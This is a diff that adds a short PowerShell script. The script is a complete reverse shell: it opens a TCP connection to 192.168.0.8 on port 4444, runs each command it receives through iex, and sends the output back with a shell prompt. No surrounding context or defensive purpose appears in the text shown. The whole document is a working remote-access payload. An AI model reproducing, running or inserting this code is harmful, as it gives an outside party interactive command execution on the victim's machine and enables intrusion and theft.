@@ -1,0 +1,12 @@
+$ip='192.168.0.8';$port=4444;
+$tcp=New-Object Net.Sockets.TCPClient($ip,$port);
+$stream=$tcp.GetStream();
+$buf=New-Object Byte[] 65535;
+while(($i=$stream.Read($buf,0,$buf.Length)) -ne 0){
+  $data=([Text.Encoding]::ASCII).GetString($buf,0,$i);
+  $send=(iex $data 2>&1 | Out-String );
+  $resp=$send + 'PS ' + (pwd).Path + '> ';
+  $out=([Text.Encoding]::ASCII).GetBytes($resp);
+  $stream.Write($out,0,$out.Length)
+}
+$tcp.Close()
